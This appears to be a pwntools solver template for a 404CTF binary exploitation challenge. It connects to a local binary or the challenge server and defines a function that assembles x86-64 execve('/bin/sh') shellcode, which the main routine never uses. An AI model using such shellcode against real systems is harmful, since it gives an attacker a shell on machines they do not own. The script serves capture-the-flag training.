from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenges.404ctf.fr", 32464)
    return r

def generate_shellcode():
    shellcode_asm = """
        xor     rdx, rdx
        movabs  rbx, 0x68732f6e69622fff
        shr     rbx, 8
        push    rbx
        mov     rdi, rsp
        xor     rax, rax
        push    rax
        push    rdi
        mov     rsi, rsp
        mov     al, 0x3b
        syscall 
        push    1
        pop     rdi
        push    0x3c
        pop     rax
        syscall 
	"""
    shellcode = asm(shellcode_asm, bits=64)
    return shellcode

def main():
    # python3 template.py LOCAL
    r = conn()

    # Bonne chance :) !

    r.interactive()

if __name__ == "__main__":
    main()
